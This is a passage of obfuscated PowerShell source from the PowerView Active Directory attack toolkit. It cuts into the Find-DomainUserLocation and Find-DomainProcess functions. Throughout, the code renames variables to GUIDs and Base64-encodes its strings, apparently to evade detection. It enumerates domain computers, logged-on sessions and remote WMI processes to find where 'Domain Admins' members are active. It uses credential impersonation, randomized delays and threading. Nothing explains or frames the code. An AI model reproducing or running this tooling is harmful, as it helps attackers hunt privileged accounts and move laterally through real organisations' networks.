${88d88e3c0c4442238ac361f03133c9af} = Get-NetLoggedon -ComputerName 
${40850bc66a0f4e928e6df4b311ffe16b}
                        ForEach 
($User in ${88d88e3c0c4442238ac361f03133c9af}) {
                     
       ${e0e6b6d01ca04c90bf52fb20f9e41317} = $User.UserName
          
                  $UserDomain = $User.LogonDomain
                    
        if ((${e0e6b6d01ca04c90bf52fb20f9e41317}) -and 
(${e0e6b6d01ca04c90bf52fb20f9e41317}.trim() -ne '')) {
               
                 if ( (-not $TargetUsers) -or ($TargetUsers -
contains ${e0e6b6d01ca04c90bf52fb20f9e41317}) -and 
(${e0e6b6d01ca04c90bf52fb20f9e41317} -notmatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAkACQA'))))) {
                                    
${165f47fdf14d46afb5277d3136d0d378} = @(Resolve-IPAddress -
ComputerName ${40850bc66a0f4e928e6df4b311ffe16b})[0].IPAddress
       
                             ${c09c014353b545b1b9f7d5aceee50b24} = 
New-Object PSObject
                                    
${c09c014353b545b1b9f7d5aceee50b24} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                       
             ${c09c014353b545b1b9f7d5aceee50b24} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) 
${e0e6b6d01ca04c90bf52fb20f9e41317}
                                  
  ${c09c014353b545b1b9f7d5aceee50b24} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${40850bc66a0f4e928e6df4b311ffe16b}
                                  
  ${c09c014353b545b1b9f7d5aceee50b24} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBQAEEAZABkAHIAZQBzAHMA'))) ${165f47fdf14d46afb5277d3136d0d378}
   
                                 ${c09c014353b545b1b9f7d5aceee50b24} 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) 
$Null
                                    
${c09c014353b545b1b9f7d5aceee50b24} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                 
                   if ($CheckAccess) {
                               
         ${3490d150e9374e0a8169a0ef6b90af2d} = Test-AdminAccess -
ComputerName ${40850bc66a0f4e928e6df4b311ffe16b}
                     
                   ${c09c014353b545b1b9f7d5aceee50b24} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) 
${3490d150e9374e0a8169a0ef6b90af2d}.IsAdmin
                          
          }
                                    else {
                
                        ${c09c014353b545b1b9f7d5aceee50b24} | Add-
Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) 
$Null
                                    }
                           
         
${c09c014353b545b1b9f7d5aceee50b24}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
  
                                  
${c09c014353b545b1b9f7d5aceee50b24}
                                
}
                            }
                        }
              
      }
                }
            }
            if ($TokenHandle) 
{
                Invoke-RevertToSelf
            }
        }
        
${bfcebd26467f492297f5dcbf75cad4ab} = $Null
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential
            }
            else {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential -Quiet
            }
        }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-
Verbose "[Find-DomainUserLocation] Total number of hosts: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count)"
            Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAEQAZQBsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAE
oAaQB0AHQAZQByAA==')))
            
${7e62acf6abb54c758ee4864a2533a125} = 0
            
${acdea612248b49fc9b8ce2f557f219ab} = New-Object System.Random
       
     ForEach (${40850bc66a0f4e928e6df4b311ffe16b} in 
${e4eae45442e047e5aa48d7f04d9dc941}) {
                
${7e62acf6abb54c758ee4864a2533a125} = 
${7e62acf6abb54c758ee4864a2533a125} + 1
                Start-Sleep 
-Seconds ${acdea612248b49fc9b8ce2f557f219ab}.Next((1-$Jitter)*
$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-
DomainUserLocation] Enumerating server 
${9c0baec859734fc983ee3c04b4cde8a7} 
(${7e62acf6abb54c758ee4864a2533a125} of 
$(${e4eae45442e047e5aa48d7f04d9dc941}.Count))"
                
Invoke-Command -ScriptBlock ${d2a8f7b9002b4411b13bcd2f1a3115ec} -
ArgumentList ${40850bc66a0f4e928e6df4b311ffe16b}, $TargetUsers, 
$CurrentUser, $Stealth, ${bfcebd26467f492297f5dcbf75cad4ab}
          
      if (${cb7c2f5226ed472aad598a82813f1629} -and $StopOnSuccess) 
{
                    Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG
4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
             
   }
            }
        }
        else {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAFUAcwBpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAG
UAYQBkAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            Write-Verbose 
"[Find-DomainUserLocation] TargetComputers length: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.Length)"
            
${d7a06eecc9954e48b3afbf05a1f9fca1} = @{
                
'TargetUsers' = $TargetUsers
                'CurrentUser' = 
$CurrentUser
                'Stealth' = $Stealth
                
'TokenHandle' = ${bfcebd26467f492297f5dcbf75cad4ab}
            }
     
       New-ThreadedFunction -ComputerName 
${e4eae45442e047e5aa48d7f04d9dc941} -ScriptBlock 
${d2a8f7b9002b4411b13bcd2f1a3115ec} -ScriptParameters 
${d7a06eecc9954e48b3afbf05a1f9fca1} -Threads $Threads
        }
    }
  
  END {
        if (${bfcebd26467f492297f5dcbf75cad4ab}) {
            
Invoke-RevertToSelf -TokenHandle 
${bfcebd26467f492297f5dcbf75cad4ab}
        }
    }
}
function Find-
DomainProcess {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUsePSCredentialType', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType
('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName 
= 'None')]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('DNSHostName')]
        [String[]]
        
$ComputerName,
        [ValidateNotNullOrEmpty()]
        [String]
     
   $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        
$ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
   
     $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        
[String]
        $ComputerSearchBase,
        [Alias
('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
    
    [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
     
   [String]
        $ComputerOperatingSystem,
        
[ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        
[String]
        $ComputerServicePack,
        
[ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        
[String]
        $ComputerSiteName,
        [Parameter
(ParameterSetName = 'TargetProcess')]
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,
    
    [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter
(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty
()]
        [String[]]
        $UserIdentity,
        [Parameter
(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty
()]
        [String]
        $UserDomain,
        [Parameter
(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty
()]
        [String]
        $UserLDAPFilter,
        [Parameter
(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty
()]
        [String]
        $UserSearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
      
  [String[]]
        $UserGroupIdentity = 'Domain Admins',
        
[Parameter(ParameterSetName = 'TargetUser')]
        [Alias
('AdminCount')]
        [Switch]
        $UserAdminCount,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        
$Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        
$Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        
$Threads = 20
    )
    BEGIN {
        
${3cb1483537e3424195869ccaa8e07f42} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')
))]) { ${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${79ab263811814b73a0d9eb6e9491daf2} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) 
{ ${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) 
{
            ${e4eae45442e047e5aa48d7f04d9dc941} = $ComputerName
     
   }
        else {
            Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAUQB1AGUAcg
B5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAG
EAaQBuAA==')))
            ${e4eae45442e047e5aa48d7f04d9dc941} = 
Get-DomainComputer @3cb1483537e3424195869ccaa8e07f42 | Select-Object 
-ExpandProperty dnshostname
        }
        Write-Verbose "[Find-
DomainProcess] TargetComputers length: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.Length)"
        if 
(${e4eae45442e047e5aa48d7f04d9dc941}.Length -eq 0) {
            
throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAATgBvACAAaA
BvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
   
     }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA==')))]) {
            
${fba72d492e4141e9a7ec127b64bd851a} = @()
            ForEach 
(${3a3b97e017384d629a5a8c379c349ded} in $ProcessName) {
              
  ${fba72d492e4141e9a7ec127b64bd851a} += 
${3a3b97e017384d629a5a8c379c349ded}.Split(',')
            }
          
  if (${fba72d492e4141e9a7ec127b64bd851a} -isnot [System.Array]) {
   
             ${fba72d492e4141e9a7ec127b64bd851a} = [String[]] @
(${fba72d492e4141e9a7ec127b64bd851a})
            }
        }
        
elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] 
-or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
       
     $TargetUsers = Get-DomainUser @79ab263811814b73a0d9eb6e9491daf2 
| Select-Object -ExpandProperty samaccountname
        }
        else 
{
            ${d868f016ade44d61bff142865900b62c} = @{
                
'Identity' = $UserGroupIdentity
                'Recurse' = $True
     
       }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) 
{ ${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            
${d868f016ade44d61bff142865900b62c}
            $TargetUsers = Get-
DomainGroupMember @d868f016ade44d61bff142865900b62c | Select-Object 
-ExpandProperty MemberName
        }
        
${d2a8f7b9002b4411b13bcd2f1a3115ec} = {
            Param
($ComputerName, $ProcessName, $TargetUsers, $Credential)
            
ForEach (${40850bc66a0f4e928e6df4b311ffe16b} in $ComputerName) {
     
           ${4efbcb35501b479291674720e11a9ca9} = Test-Connection -
Count 1 -Quiet -ComputerName ${40850bc66a0f4e928e6df4b311ffe16b}
     
           if (${4efbcb35501b479291674720e11a9ca9}) {
                
    if ($Credential) {
                        
${9f1c5a32e35a452f8a32575d9ca63f2f} = Get-WMIProcess -Credential 
$Credential -ComputerName ${40850bc66a0f4e928e6df4b311ffe16b} -
ErrorAction SilentlyContinue
                    }
                    
else {
                        ${9f1c5a32e35a452f8a32575d9ca63f2f} = 
Get-WMIProcess -ComputerName ${40850bc66a0f4e928e6df4b311ffe16b} -
ErrorAction SilentlyContinue
                    }
                    
ForEach (${3139d971e1ae482d8eee69861eb17ea0} in 
${9f1c5a32e35a452f8a32575d9ca63f2f}) {
                        if 
($ProcessName) {
                            if ($ProcessName -
Contains ${3139d971e1ae482d8eee69861eb17ea0}.ProcessName) {
          
                      ${3139d971e1ae482d8eee69861eb17ea0}
            
                }
                        }
                        
elseif ($TargetUsers -Contains 
${3139d971e1ae482d8eee69861eb17ea0}.User) {
                          
  ${3139d971e1ae482d8eee69861eb17ea0}
                        }
       
             }
                }
            }
        }
    }
    
PROCESS {
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-
Verbose "[Find-DomainProcess] Total number of hosts: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count)"
            Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAARABlAGwAYQ
B5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAH
IA')))
            ${7e62acf6abb54c758ee4864a2533a125} = 0
            
${acdea612248b49fc9b8ce2f557f219ab} = New-Object System.Random
       
     ForEach (${40850bc66a0f4e928e6df4b311ffe16b} in 
${e4eae45442e047e5aa48d7f04d9dc941}) {
                
${7e62acf6abb54c758ee4864a2533a125} = 
${7e62acf6abb54c758ee4864a2533a125} + 1
                Start-Sleep 
-Seconds ${acdea612248b49fc9b8ce2f557f219ab}.Next((1-$Jitter)*
